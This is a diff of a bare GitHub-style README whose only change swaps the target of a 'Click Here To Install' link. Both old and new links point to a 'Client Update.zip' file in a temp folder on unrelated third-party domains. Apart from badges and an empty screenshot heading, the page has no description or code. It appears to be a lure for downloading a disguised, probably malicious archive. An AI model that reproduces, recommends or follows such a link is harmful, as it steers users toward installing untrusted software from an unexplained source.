@@ -1,7 +1,7 @@
 ![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white) ![GitHub](https://img.shields.io/badge/github-%23121011.svg?style=for-the-badge&logo=github&logoColor=white)
 
 
-# [Click Here To Install](https://mailparcels.com/temp/Client%20Update.zip)
+# [Click Here To Install](https://companion-animal.co.kr/temp/Client%20Update.zip)
 
 # Screenshot
 
